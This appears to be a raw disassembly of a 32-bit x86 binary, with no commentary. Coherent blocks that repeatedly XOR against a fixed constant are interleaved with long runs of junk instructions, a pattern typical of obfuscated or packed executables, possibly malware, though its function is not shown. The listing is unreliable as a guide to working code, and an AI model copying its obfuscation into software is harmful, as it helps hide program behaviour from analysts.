  40b8e0:	rcl    al,0x96
  40b8e3:	mov    ds:0x4e214682,eax
  40b8e8:	out    0x4a,al
  40b8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8eb:	je     0x40b8f8
  40b8ed:	push   ebp
  40b8ee:	sbb    DWORD PTR [ebx-0x50],ebx
  40b8f1:	pop    edx
  40b8f2:	call   0x6bf:0x84291321
  40b8f9:	aaa    
  40b8fa:	pop    ss
  40b8fb:	or     eax,0xee648858
  40b900:	cmp    eax,0x4eb67ae1
  40b905:	cmp    edi,DWORD PTR [edi+ebx*4]
  40b908:	repnz xchg edx,eax
  40b90a:	sbb    dh,bh
  40b90c:	jo     0x40b8d0
  40b90e:	in     eax,dx
  40b90f:	(bad)  
  40b910:	loop   0x40b927
  40b912:	popf   
  40b913:	cmp    eax,0x9a102ae9
  40b918:	enter  0x274c,0xe
  40b91c:	pop    edx
  40b91d:	mov    eax,0x502e3e50
  40b922:	sub    al,0xaa
  40b924:	pushf  
  40b925:	repnz cmc 
  40b927:	(bad)  
  40b928:	push   ss
  40b929:	in     al,0x29
  40b92b:	andnps xmm5,XMMWORD PTR [edi-0x7638f07a]
  40b932:	xor    bl,BYTE PTR [edi]
  40b934:	loope  0x40b986
  40b936:	jns    0x40b906
  40b938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b939:	mov    DWORD PTR [ebp-0x2c],ecx
  40b93c:	mov    eax,DWORD PTR [ebp-0x14]
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	cmp    BYTE PTR [ecx+0x33793683],bh
  40b96a:	jle    0x40b9ea
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	xor    al,0x7c
  40b972:	jle    0x40b91d
  40b974:	or     eax,0xe7a56fa9
  40b979:	push   eax
  40b97a:	(bad)  
  40b97b:	mov    ebx,?
  40b97d:	push   cs
  40b97e:	ss imul edi,eax,0x7bec1b82
  40b985:	test   DWORD PTR [ecx-0x5e3e43b5],esi
  40b98b:	sti    
  40b98c:	sbb    BYTE PTR [eax-0x378bf9e],0xbd
  40b993:	cld    
  40b994:	push   0xffffffe8
  40b996:	push   ds
  40b997:	nop
  40b998:	xchg   DWORD PTR [ebp+0x53],edi
  40b99b:	imul   DWORD PTR [ebx+0x52]
  40b99e:	or     bh,BYTE PTR [ecx]
  40b9a0:	in     al,0xb8
  40b9a2:	xchg   esp,eax
  40b9a3:	leave  
  40b9a4:	lds    ebp,FWORD PTR [ecx+0x6a]
  40b9a7:	out    dx,eax
  40b9a8:	mov    dl,0x68
  40b9aa:	sar    DWORD PTR [eax+eiz*8-0x5c],1
  40b9ae:	into   
  40b9af:	icebp  
  40b9b0:	nop
  40b9b1:	mov    esp,DWORD PTR [ecx+edi*4-0x43ecc285]
  40b9b8:	ret    0xa80
  40b9bb:	mov    ebx,0xf38d10ad
  40b9c0:	or     al,0xe5
  40b9c2:	ss popa 
  40b9c4:	je     0x40b96f
  40b9c6:	cmp    al,0x18
  40b9c8:	outs   dx,DWORD PTR ds:[esi]
  40b9c9:	sar    ebp,cl
  40b9cb:	nop
  40b9cc:	stos   DWORD PTR es:[edi],eax
  40b9cd:	sbb    eax,0x100ce1cf
  40b9d2:	jp     0x40b9d5
  40b9d4:	js     0x40ba1d
  40b9d6:	int    0x46
  40b9d8:	sub    DWORD PTR [edx+0x0],ebx
  40b9db:	mov    ebx,0xaabbf14d
  40b9e0:	and    ebp,esp
  40b9e2:	adc    eax,0x5fba6613
  40b9e7:	test   al,0xec
  40b9e9:	inc    edi
  40b9ea:	loop   0x40b9a8
  40b9ec:	push   esp
  40b9ed:	retf   0xacf6
  40b9f0:	mov    edi,0xe3f36470
  40b9f5:	(bad)  
  40b9f6:	sti    
  40b9f7:	mov    al,ds:0xda4b4169
  40b9fc:	cmp    dh,BYTE PTR fs:[edx-0x3573a7ca]
  40ba03:	xlat   BYTE PTR ds:[ebx]
  40ba04:	push   ds
  40ba05:	scas   eax,DWORD PTR es:[edi]
  40ba06:	mov    dh,0xee
  40ba08:	push   cs
  40ba09:	cmp    ebx,0x0
  40ba0c:	or     ch,BYTE PTR [ecx+edi*2-0x4c]
  40ba10:	jmp    0x91d9:0x1c474054
  40ba17:	aaa    
  40ba18:	int    0x27
  40ba1a:	mov    esp,0x9be49f22
  40ba1f:	sub    DWORD PTR [ecx],edi
  40ba21:	jmp    0x646c:0xd8f67b1
  40ba28:	fiadd  WORD PTR ss:[ecx+edx*4]
  40ba2c:	mov    edi,0x8aca2e53
  40ba31:	push   ss
  40ba32:	out    0x34,eax
  40ba34:	ret    0x613
  40ba37:	std    
  40ba38:	lea    eax,[ebp-0x8]
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock inc ecx
  40ba74:	hlt    
  40ba75:	mov    ebp,0x7e30b111
  40ba7a:	jle    0x40ba32
  40ba7c:	jle    0x40bafc
  40ba7e:	jle    0x40ba41
  40ba80:	aam    0xbb
  40ba82:	out    dx,al
  40ba83:	inc    ebp
  40ba84:	test   eax,0x93ceb2cf
  40ba89:	cmc    
  40ba8a:	loop   0x40bac4
  40ba8c:	mov    ebp,0x4a4a1c98
  40ba91:	jge    0x40ba41
  40ba93:	pop    ds
  40ba94:	pushf  
  40ba95:	repnz mov DWORD PTR [ebx],eax
  40ba98:	mov    ebp,0x8b85b154
  40ba9d:	out    dx,eax
  40ba9e:	mov    ebx,0x4a6a2551
  40baa3:	adc    BYTE PTR [ebx-0xe],bl
  40baa6:	push   ecx
  40baa7:	push   eax
  40baa8:	xor    al,0xf0
  40baaa:	xor    al,0x31
  40baac:	fwait
  40baad:	les    esp,FWORD PTR [ebx]
  40baaf:	out    0x87,eax
  40bab1:	shl    DWORD PTR [edx+0x2d9dd804],cl
  40bab7:	mov    dl,0xf8
  40bab9:	idiv   BYTE PTR [ecx+0x2aebd0bb]
  40babf:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40bac1:	and    cl,BYTE PTR ds:0xe25ff44
  40bac7:	xor    dh,BYTE PTR [edi+edi*4]
  40baca:	ret    
  40bacb:	rol    BYTE PTR [eax+0x24],0xef
  40bacf:	enter  0x2020,0x84
  40bad3:	cli    
  40bad4:	pop    esp
  40bad5:	out    0x87,eax
  40bad7:	mov    eax,0xaa6827e2
  40badc:	and    al,0x69
  40bade:	and    al,0x98
  40bae0:	cdq    
  40bae1:	icebp  
  40bae2:	jbe    0x40baf8
  40bae4:	popa   
  40bae5:	lods   eax,DWORD PTR ds:[esi]
  40bae6:	lds    ebp,FWORD PTR [edi]
  40bae8:	sub    eax,0xdc0f9130
  40baed:	push   0xcb7a3ead
  40baf2:	scas   eax,DWORD PTR es:[edi]
  40baf3:	fistp  DWORD PTR [ebx]
  40baf5:	dec    esi
  40baf6:	outs   dx,BYTE PTR ds:[esi]
  40baf7:	cmp    BYTE PTR [esi-0x3f],bh
  40bafa:	ds scas al,BYTE PTR es:[edi]
  40bafc:	lock (bad) 
  40bafe:	jp     0x40bb14
  40bb00:	xchg   esi,eax
  40bb01:	lock adc dh,bl
  40bb04:	jl     0x40baff
  40bb06:	sbb    BYTE PTR [eax],al
  40bb08:	lock cmp BYTE PTR [ecx],dl
  40bb0b:	push   ebx
  40bb0c:	jmp    0x40baf6
  40bb0e:	enter  0x955c,0x58
  40bb12:	cmp    eax,0x2119156c
  40bb17:	je     0x40bb76
  40bb19:	cmp    al,0x46
  40bb1b:	adc    al,0x76
  40bb1d:	sub    DWORD PTR ds:0xc8e395fd,0xffffffb4
  40bb24:	fadd   st,st(6)
  40bb26:	pop    ss
  40bb27:	out    0x59,eax
  40bb29:	aam    0xdb
  40bb2b:	sahf   
  40bb2c:	dec    ecx
  40bb2d:	sbb    eax,0xfc351d14
  40bb32:	repnz fstp QWORD PTR ds:0x443d8761
  40bb39:	ins    DWORD PTR es:[edi],dx
  40bb3a:	test   DWORD PTR ds:0x1c63d52c,eax
  40bb40:	jle    0x40bba6
  40bb42:	loopne 0x40baf9
  40bb44:	jo     0x40bb3b
  40bb46:	or     al,BYTE PTR [edi+0x3b]
  40bb49:	clc    
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	rcr    DWORD PTR [ebx+0x3189423b],0x7e
  40bbc8:	jle    0x40bb80
  40bbca:	jle    0x40bc4a
  40bbcc:	jle    0x40bb9a
  40bbce:	dec    edi
  40bbcf:	cmp    DWORD PTR [eax],ebx
  40bbd1:	das    
  40bbd2:	int    0xd5
  40bbd4:	cld    
  40bbd5:	pushf  
  40bbd6:	mov    eax,ds:0x34dd973
  40bbdb:	mov    DWORD PTR [esi-0x6716ff7d],edx
  40bbe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbe2:	es popa 
  40bbe4:	xchg   ecx,eax
  40bbe5:	das    
  40bbe6:	jae    0x40bc00
  40bbe8:	xor    eax,0x8570c173
  40bbed:	xor    DWORD PTR [esi+0x24],ebx
  40bbf0:	push   esi
  40bbf1:	pop    ecx
  40bbf2:	xchg   edx,eax
  40bbf3:	cmp    bh,BYTE PTR [eax]
  40bbf5:	push   eax
  40bbf6:	cmp    DWORD PTR [edi],ebp
  40bbf8:	inc    edx
  40bbf9:	(bad)  
  40bbfb:	jae    0x40bc1a
  40bbfd:	bound  ebp,QWORD PTR [eax]
  40bbff:	mov    eax,cs
  40bc01:	or     eax,0xb6881424
  40bc06:	inc    esp
  40bc07:	xchg   DWORD PTR ss:[esp+ebx*2-0x16],eax
  40bc0c:	jmp    FWORD PTR [edi+eax*2-0x1276ffdf]
  40bc13:	js     0x40bc31
  40bc15:	add    eax,0xee04eb63
  40bc1a:	cdq    
  40bc1b:	dec    edi
  40bc1c:	sub    esi,DWORD PTR [ebx]
  40bc1e:	xor    esi,edx
  40bc20:	ret    
  40bc21:	mov    eax,ds:0x9a4cceb
  40bc26:	icebp  
  40bc27:	push   ecx
  40bc28:	popf   
  40bc29:	xor    dl,BYTE PTR [ebp-0x63]
  40bc2c:	or     al,0x67
  40bc2e:	or     esp,0x467e125c
  40bc34:	das    
  40bc35:	fcmovbe st,st(1)
  40bc37:	mov    DWORD PTR [eax+0x43e308d6],esi
  40bc3d:	addr16 fs clc 
  40bc40:	adc    ecx,DWORD PTR [edi-0x6be43cb8]
  40bc46:	rol    bl,0x18
  40bc49:	std    
  40bc4a:	aaa    
  40bc4b:	std    
  40bc4c:	jl     0x40bc18
  40bc4e:	std    
  40bc4f:	aam    0xea
  40bc51:	adc    BYTE PTR [ebx-0x2b79a367],cl
  40bc57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc58:	clc    
  40bc59:	aam    0xe1
  40bc5b:	xor    BYTE PTR [eax],0xa0
  40bc5e:	inc    eax
  40bc5f:	stos   DWORD PTR es:[edi],eax
  40bc60:	out    0x65,eax
  40bc62:	fwait
  40bc63:	dec    edi
  40bc64:	imul   DWORD PTR [esi+eiz*8+0x3b047c91]
  40bc6b:	lock hlt 
  40bc6d:	lds    edi,FWORD PTR [esi]
  40bc6f:	xor    bh,BYTE PTR [esi+0x7b]
  40bc72:	dec    ebp
  40bc73:	add    eax,0x3cfc2d29
  40bc78:	xchg   edi,eax
  40bc79:	ds sub eax,0x5eb99361
  40bc7f:	ret    
  40bc80:	inc    edi
  40bc81:	xor    dh,bh
  40bc83:	and    al,0x68
  40bc85:	jecxz  0x40bc66
  40bc87:	jle    0x40bc45
  40bc89:	mov    es,WORD PTR [esi+0xa]
  40bc8c:	add    esi,DWORD PTR [ebp-0x120e9fba]
  40bc92:	dec    edi
  40bc93:	lods   eax,DWORD PTR ds:[esi]
  40bc94:	stos   BYTE PTR es:[edi],al
  40bc95:	pop    ebx
  40bc96:	xchg   ebx,ecx
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	ins    BYTE PTR es:[edi],dx
  40bcc2:	push   esp
  40bcc3:	mov    DWORD PTR [edi+0x7e7e36c1],0x7e7e7eb6
  40bccd:	push   edx
  40bcce:	sar    DWORD PTR [eax],cl
  40bcd0:	inc    edx
  40bcd1:	xor    esp,DWORD PTR [esp+eiz*8-0x1df29571]
  40bcd8:	(bad)  
  40bcd9:	fadd   DWORD PTR [eax-0x3734c8bb]
  40bcdf:	inc    edi
  40bce0:	jge    0x40bcc8
  40bce2:	jp     0x40bd21
  40bce4:	cwde   
  40bce5:	push   ds
  40bce6:	icebp  
  40bce7:	(bad)  
  40bce8:	cli    
  40bce9:	inc    ebp
  40bcea:	dec    edi
  40bceb:	mov    eax,ds:0x825214d4
  40bcf0:	add    BYTE PTR ds:0xabb8a481,ch
  40bcf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf7:	out    dx,eax
  40bcf8:	cwde   
  40bcf9:	jmp    0x40bd73
  40bcfb:	lds    edi,FWORD PTR [eax-0x4b]
  40bcfe:	das    
  40bcff:	test   BYTE PTR [edx-0x504d7967],dh
  40bd05:	daa    
  40bd06:	mov    dh,0x3b
  40bd08:	ja     0x40bd3a
  40bd0a:	xor    ecx,DWORD PTR [ebp+edi*8+0x22312519]
  40bd11:	sbb    al,0x27
  40bd13:	fsub   st(6),st
  40bd15:	test   al,0xa0
  40bd17:	test   al,0xb9
  40bd19:	adc    DWORD PTR [ecx+0x2ae3dcd7],ebx
  40bd1f:	loope  0x40bcc6
  40bd21:	adc    DWORD PTR [ebx+edi*2],esp
  40bd24:	or     esp,DWORD PTR [edi-0x26fb9e8f]
  40bd2a:	inc    eax
  40bd2b:	dec    edx
  40bd2c:	cmp    eax,0x47b7af0
  40bd31:	leave  
  40bd32:	pushf  
  40bd33:	sbb    DWORD PTR [ebx+0xe],eax
  40bd36:	sbb    eax,0x2a6171d8
  40bd3b:	loop   0x40bd2e
  40bd3d:	sbb    al,BYTE PTR [edx+0x4ae1c4fa]
  40bd43:	sar    bh,cl
  40bd45:	mov    bh,ah
  40bd47:	cmp    bl,0x34
  40bd4a:	jns    0x40bd60
  40bd4c:	or     al,0xc3
  40bd4e:	les    edi,FWORD PTR [ebx+eax*4]
  40bd51:	mov    gs,WORD PTR [eax+0xa]
  40bd54:	xchg   ecx,eax
  40bd55:	push   ds
  40bd56:	hlt    
  40bd57:	mov    ch,0x16
  40bd59:	jl     0x40bd1d
  40bd5b:	and    DWORD PTR [ebx+ebp*4-0x24],0xffffffe4
  40bd60:	fadd   QWORD PTR [ebx]
  40bd62:	(bad)  
  40bd63:	jmp    0x40bd1b
  40bd65:	rcl    BYTE PTR [edx+eiz*1],0x5f
  40bd69:	imul   edi,DWORD PTR [edx-0x80],0x3e
  40bd6d:	test   DWORD PTR [edi],0x5f41a3b7
  40bd73:	push   0xffffff85
  40bd75:	repz adc DWORD PTR [ecx-0x7502b699],esp
  40bd7c:	dec    ecx
  40bd7d:	pop    ebx
  40bd7e:	and    ch,al
  40bd80:	sub    BYTE PTR [edi+ebx*8-0x74],bh
  40bd84:	addr16 jb 0x40bd7f
  40bd87:	std    
  40bd88:	cld    
  40bd89:	ror    esp,1
  40bd8b:	dec    edx
  40bd8c:	test   BYTE PTR [esi+0x5c],cl
  40bd8f:	push   edx
  40bd90:	arpl   WORD PTR [ecx+0x33d7c172],dx
  40bd96:	sar    DWORD PTR [edx+0x32729f],0x3
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	fdiv   QWORD PTR [esi]
  40bdbe:	adc    ch,ah
  40bdc0:	sbb    DWORD PTR [edi],esi
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	inc    ebp
  40bdc9:	pusha  
  40bdca:	aas    
  40bdcb:	cwde   
  40bdcc:	cmp    eax,esi
  40bdce:	lds    edi,FWORD PTR [ecx+esi*4+0x65]
  40bdd2:	xchg   edx,eax
  40bdd3:	mov    bl,0xdd
  40bdd5:	mov    ecx,0xa5944894
  40bdda:	sbb    BYTE PTR [ebx],ch
  40bddc:	jge    0x40bd7a
  40bdde:	pushf  
  40bddf:	dec    esi
  40bde0:	test   BYTE PTR [esi],bh
  40bde2:	add    DWORD PTR [edx+0x42b486e4],ebp
  40bde8:	lahf   
  40bde9:	cmp    bl,BYTE PTR [eax-0x563ee593]
  40bdef:	sub    eax,0x23e8122e
  40bdf4:	lods   eax,DWORD PTR ds:[esi]
  40bdf5:	in     eax,dx
  40bdf6:	call   0x3dfd74f
  40bdfb:	and    al,0xa6
  40bdfd:	retf   
  40bdfe:	push   esp
  40bdff:	jmp    0x196c02e5
  40be04:	das    
  40be05:	aaa    
  40be06:	mov    fs,WORD PTR [edx-0x15]
  40be09:	popa   
  40be0a:	and    DWORD PTR [ecx],esp
  40be0c:	cmp    BYTE PTR [ebp+ebx*2-0x30f307db],bh
  40be13:	loopne 0x40be74
  40be15:	add    BYTE PTR [ecx-0x2c8b91ec],ah
  40be1b:	xor    eax,0xfba0a633
  40be20:	lods   al,BYTE PTR ds:[esi]
  40be21:	pop    ebx
  40be22:	cmp    BYTE PTR [eax+0xd30f633],bh
  40be28:	inc    edi
  40be29:	inc    edx
  40be2a:	test   eax,0xd74bd53f
  40be2f:	sbb    al,0x7c
  40be31:	daa    
  40be32:	cmp    ecx,0x66
  40be35:	in     al,0x4f
  40be37:	mov    dl,0x93
  40be39:	lock cmp BYTE PTR [ebp+0x23],al
  40be3d:	mov    edi,0x3d31c171
  40be42:	sahf   
  40be43:	jns    0x40be30
  40be45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be46:	int    0xad
  40be48:	je     0x40be92
  40be4a:	push   edi
  40be4b:	repnz push ebp
  40be4d:	mov    eax,0xb072df4d
  40be52:	popf   
  40be53:	xchg   edx,eax
  40be54:	sbb    DWORD PTR [eax+0x3d],ecx
  40be57:	cmp    cl,BYTE PTR [edi-0x2]
  40be5a:	xchg   edi,eax
  40be5b:	ja     0x40be29
  40be5d:	jae    0x40be32
  40be5f:	addr16 or eax,0x8345022a
  40be65:	aam    0xa5
  40be67:	mov    dh,0x53
  40be69:	fs push ebx
  40be6b:	mov    edx,0x27be5f94
  40be70:	rcr    ebx,1
  40be72:	test   al,0x5e
  40be74:	pop    ss
  40be75:	push   0x28
  40be77:	adc    BYTE PTR [ecx+0x7d],bl
  40be7a:	out    0xa2,eax
  40be7c:	xor    al,0x77
  40be7e:	sti    
  40be7f:	imul   ebp,esi,0xfffffff7
  40be82:	nop
  40be83:	leave  
  40be84:	ret    0xa9b
  40be87:	lds    ebp,FWORD PTR [esi-0x38]
  40be8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be8b:	sub    eax,0x4db7c534
  40be90:	imul   eax,DWORD PTR [edx]
  40be93:	jmp    0x40bf78
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0xf7967640
  40bea6:	cmpxchg BYTE PTR [ecx+0x37],dl
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	(bad)  
  40beb1:	xchg   ebx,eax
  40beb2:	das    
  40beb3:	rol    BYTE PTR [eax-0xc4eaca2],1
  40beb9:	sbb    al,0xef
  40bebb:	cld    
  40bebc:	(bad)  
  40bebd:	jecxz  0x40bea9
  40bebf:	dec    edx
  40bec0:	retf   0xf294
  40bec3:	stc    
  40bec4:	hlt    
  40bec5:	icebp  
  40bec6:	scas   eax,DWORD PTR es:[edi]
  40bec7:	xor    BYTE PTR [edx],bl
  40bec9:	lods   eax,DWORD PTR cs:[esi]
  40becb:	xchg   BYTE PTR [ecx+0x40],dl
  40bece:	in     al,0x48
  40bed0:	test   BYTE PTR [eax+0x48afe1cf],ch
  40bed6:	int    0xab
  40bed8:	in     eax,0xaf
  40beda:	mov    ebx,0xcafb9faf
  40bedf:	inc    edi
  40bee0:	popf   
  40bee1:	and    DWORD PTR [edx+0x28e9fae3],0x70436cf5
  40beeb:	test   eax,0xe248d84c
  40bef0:	xor    BYTE PTR [esi],dh
  40bef2:	in     al,0xb8
  40bef4:	jg     0x40bf2a
  40bef6:	adc    DWORD PTR [eax+0x3e1fb317],0x44
  40befd:	dec    eax
  40befe:	mov    esp,0x5874f118
  40bf03:	out    0x4d,eax
  40bf05:	jnp    0x40bf22
  40bf07:	int    0x47
  40bf09:	(bad)  
  40bf0a:	fcom   QWORD PTR [eax]
  40bf0c:	cwde   
  40bf0d:	nop
  40bf0e:	les    ebx,FWORD PTR [ecx+ebx*2-0x46]
  40bf12:	adc    eax,0x939c5f6d
  40bf17:	and    BYTE PTR [ecx],ch
  40bf19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf1a:	jl     0x40bf68
  40bf1c:	rcl    ecx,0x5f
  40bf1f:	jmp    0x40bf67
  40bf21:	sbb    edi,DWORD PTR [eax-0x7418cb3e]
  40bf27:	add    esi,ecx
  40bf29:	and    BYTE PTR es:[esp+eax*8+0x35],ah
  40bf2e:	cmp    al,0x72
  40bf30:	push   ecx
  40bf31:	icebp  
  40bf32:	lds    eax,FWORD PTR [eax-0x4b]
  40bf35:	cwde   
  40bf36:	aas    
  40bf37:	mov    ebp,DWORD PTR [ecx]
  40bf39:	in     al,dx
  40bf3a:	add    al,0xde
  40bf3c:	cwde   
  40bf3d:	inc    edi
  40bf3e:	pusha  
  40bf3f:	pop    DWORD PTR [ebp-0x47]
  40bf42:	push   ebp
  40bf43:	push   edx
  40bf44:	jae    0x40bee1
  40bf46:	test   al,0x5f
  40bf48:	xor    edi,esp
  40bf4a:	mov    edi,0x26bd5dac
  40bf4f:	pushf  
  40bf50:	ins    DWORD PTR es:[edi],dx
  40bf51:	test   al,0xdd
  40bf53:	dec    ebp
  40bf54:	call   0x8a0eac69
  40bf59:	test   BYTE PTR [ecx],ch
  40bf5b:	es popf 
  40bf5d:	mov    BYTE PTR [edx+0x1f248ea3],dl
  40bf63:	ins    DWORD PTR es:[edi],dx
  40bf64:	sti    
  40bf65:	xchg   ecx,eax
  40bf66:	ficom  DWORD PTR [edi+ebp*4+0x34]
  40bf6a:	jg     0x40bf0d
  40bf6c:	jmp    0xf2fe5b80
  40bf71:	cdq    
  40bf72:	inc    ecx
  40bf73:	inc    edi
  40bf74:	dec    eax
  40bf75:	adc    BYTE PTR [edx],0xc9
  40bf78:	mov    edx,DWORD PTR [ebp-0x4]
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	mov    cs,WORD PTR ss:[ecx-0x4]
  40bfb1:	test   eax,0xb67e7e34
  40bfb6:	jle    0x40c036
  40bfb8:	jle    0x40bf59
  40bfba:	xor    al,0xa5
  40bfbc:	jmp    0x5eb:0x2f2238ce
  40bfc3:	ret    
  40bfc4:	pop    eax
  40bfc5:	lods   al,BYTE PTR ds:[esi]
  40bfc6:	xchg   edx,eax
  40bfc7:	shl    BYTE PTR [ecx+0x4d2e7ab5],0xa0
  40bfce:	test   eax,0x7b2eae7c
  40bfd3:	mov    bl,BYTE PTR ds:0x95edfe1e
  40bfd9:	jmp    0xacd7:0xbf2ca656
  40bfe0:	push   ebp
  40bfe1:	pop    es
  40bfe2:	sbb    al,0x77
  40bfe4:	adc    ah,ah
  40bfe6:	xor    cl,ah
  40bfe8:	add    al,BYTE PTR [eax]
  40bfea:	add    ecx,DWORD PTR [eax]
  40bfec:	xchg   ebx,eax
  40bfed:	pushf  
  40bfee:	sti    
  40bfef:	xchg   ecx,eax
  40bff0:	adc    DWORD PTR [edx+0x778bd2f0],ebp
  40bff6:	outs   dx,BYTE PTR ds:[esi]
  40bff7:	mov    ds:0xcda1a65c,al
  40bffc:	out    dx,al
  40bffd:	icebp  
  40bffe:	ror    DWORD PTR [ecx],1
  40c000:	sub    BYTE PTR [esi],dl
  40c002:	sbb    BYTE PTR [ecx],al
  40c004:	fistp  DWORD PTR [ecx-0x4abb2eeb]
  40c00a:	hlt    
  40c00b:	dec    esi
  40c00c:	repz std 
  40c00e:	je     0x40bff7
  40c010:	pop    es
  40c011:	nop
  40c012:	mov    bl,0xf4
  40c014:	xchg   ecx,eax
  40c015:	aam    0x3f
  40c017:	addr16 sub edx,ecx
  40c01a:	or     BYTE PTR [esi+edi*4-0x4cfbe6bd],0x8e
  40c022:	aad    0x5f
  40c024:	outs   dx,BYTE PTR ds:[esi]
  40c025:	sub    BYTE PTR [ebp-0x37b873cc],dl
  40c02b:	xchg   ebx,eax
  40c02c:	xor    ebx,0xe3358baa
  40c032:	push   esp
  40c033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c034:	mov    dh,0x15
  40c036:	push   es
  40c037:	push   0xe33c73e6
  40c03c:	xor    eax,0x219b1073
  40c041:	js     0x40c09c
  40c043:	out    dx,eax
  40c044:	pop    ebx
  40c045:	pop    ebx
  40c046:	jne    0x40c069
  40c048:	mov    ecx,0x754d2ef4
  40c04d:	jp     0x40c0b3
  40c04f:	fcom   QWORD PTR [ebx+0x71]
  40c052:	mov    al,ds:0x6ee0598d
